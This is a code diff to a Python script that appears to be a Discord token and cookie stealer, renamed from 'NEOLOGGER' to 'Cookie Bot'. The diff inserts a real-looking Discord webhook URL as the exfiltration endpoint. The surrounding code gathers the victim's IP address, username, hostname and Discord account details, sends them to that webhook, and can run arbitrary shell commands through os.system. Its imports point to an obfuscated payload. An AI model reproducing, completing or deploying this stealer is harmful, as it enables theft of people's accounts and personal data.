@@ -67,7 +67,7 @@ import marshal, zlib, base64, lzma
 import json
 from base64 import *
 
-send_webhook = "your shitty webhook"
+send_webhook = "Cookie Bot"
 
 def command(c):
     os.system(c)
@@ -175,7 +175,7 @@ premium = info['IsPremium']
 
 discord = Discord(url=send_webhook)
 discord.post(
-    username="NEOLOGGER ",
+    username="Cookie Bot ",
     avatar_url="https://cdn.discordapp.com/attachments/1064200694455881871/1067842925922373723/34ea20e0747020c021677987211a6353.jpg",
     embeds=[
         {
@@ -225,8 +225,8 @@ def get_size(bytes, suffix="B"):
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
 
-WEBHOOK_URL = "your shitty webhook" #WEBHOOK URL GOES INSIDE THE QOUTES!
-webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[your shitty webhook]') # Initializing webhook
+WEBHOOK_URL = "https://discord.com/api/webhooks/1373368795665530983/ne53MK3FunpX3DJCc5MaWjOwkDG6aniqXc-WLhaXym8y7SwQROApMhMuUIBiqbw-Kn1n" #WEBHOOK URL GOES INSIDE THE QOUTES!
+webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[Cookie Bot]') # Initializing webhook
 ip = requests.get('https://api.ipify.org').text
 username = getpass.getuser()
 hostname = socket.gethostname()
